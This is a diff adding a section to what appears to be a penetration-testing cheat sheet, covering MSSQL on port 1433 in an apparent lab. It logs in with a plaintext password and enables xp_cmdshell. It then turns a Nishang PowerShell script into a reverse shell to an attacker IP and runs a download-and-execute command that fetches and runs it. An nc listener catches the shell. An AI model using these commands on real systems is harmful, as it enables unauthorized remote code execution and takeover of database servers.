@@ -563,6 +563,48 @@ smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t 10.20
 - MS14-068
 - GetUserSPNs
 
+
+==============
+Port 1433 SQL
+==============
+Find the SQL creds and login
+sqsh -S 10.10.10.59 -U admin -P "S3cur3P@ssw0rD"
+
+Test out the whoami command using xp_cmdshell.
+	1> xp_cmdshell 'whoami';
+	2> go
+If xp_cmdshell is disabled try enabling it
+	1> EXEC sp_configure 'show advanced options', 1;
+	2> go
+	Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE
+	statement to install.
+	(return status = 0)
+	1> RECONFIGURE; 
+	2> go
+	1> EXEC sp_configure 'xp_cmdshell', 1;
+	2> go
+	Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to
+	install.
+	(return status = 0)
+	1> RECONFIGURE;
+	2> go
+	
+Initial Foothold
+Download the Nishang repository and copy the Invoke-PowerShellTcp.ps1 script into your current directory.
+	cp ../../tools/nishang/Shells/Invoke-PowerShellTcp.ps1 .
+	mv Invoke-PowerShellTcp.ps1 shell.ps1
+	
+Add the following line to the end of the script with the attack machine configuration settings.
+	Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.45 -Port 1234
+	python -m SimpleHTTPServer 5555
+	
+	1> xp_cmdshell "powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.45:5555/shell.ps1')"
+	2> go
+	
+	nc -nlvp 1234
+	Get a shell back
+	
+
 ======================
 Evil-winrm (Port 5985)
 ======================
